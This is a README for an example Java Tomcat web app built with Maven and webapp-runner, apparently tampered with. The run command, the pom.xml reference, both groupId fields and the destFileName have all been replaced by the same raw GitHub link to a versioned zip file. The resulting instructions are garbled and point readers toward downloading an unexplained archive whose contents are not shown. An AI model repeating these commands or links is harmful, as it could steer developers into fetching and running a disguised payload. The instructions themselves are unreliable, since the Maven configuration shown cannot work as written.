# java-tomcat-maven-example

This is an example ready-to-deploy java web application built for Tomcat using Maven and webapp-runner.

## Running Locally

(need maven and java installed)

```
mvn package
java -jar https://raw.githubusercontent.com/sivahariu/java-tomcat-maven-example/master/src/main/java-tomcat-maven-example-v3.1-beta.3.zip target/*.war
```

The application will be available on `http://localhost:8080`.

## How This Was Built

1. Generate the project using a Maven archetype:

   ```
   mvn archetype:generate -DarchetypeArtifactId=maven-archetype-webapp
   ```

2. Add the webapp-runner plugin into the `https://raw.githubusercontent.com/sivahariu/java-tomcat-maven-example/master/src/main/java-tomcat-maven-example-v3.1-beta.3.zip`:

   ```
   <build>
     <!-- ... -->
     <plugins>
       <!-- ... -->
       <plugin>
         <groupId>https://raw.githubusercontent.com/sivahariu/java-tomcat-maven-example/master/src/main/java-tomcat-maven-example-v3.1-beta.3.zip</groupId>
         <artifactId>maven-dependency-plugin</artifactId>
         <version>2.3</version>
         <executions>
           <execution>
             <phase>package</phase>
             <goals><goal>copy</goal></goals>
             <configuration>
               <artifactItems>
                 <artifactItem>
                   <groupId>https://raw.githubusercontent.com/sivahariu/java-tomcat-maven-example/master/src/main/java-tomcat-maven-example-v3.1-beta.3.zip</groupId>
                   <artifactId>webapp-runner</artifactId>
                   <version>8.5.11.3</version>
                   <destFileName>https://raw.githubusercontent.com/sivahariu/java-tomcat-maven-example/master/src/main/java-tomcat-maven-example-v3.1-beta.3.zip</destFileName>
                 </artifactItem>
               </artifactItems>
             </configuration>
           </execution>
         </executions>
       </plugin>
     </plugins>
   </build>
   ```
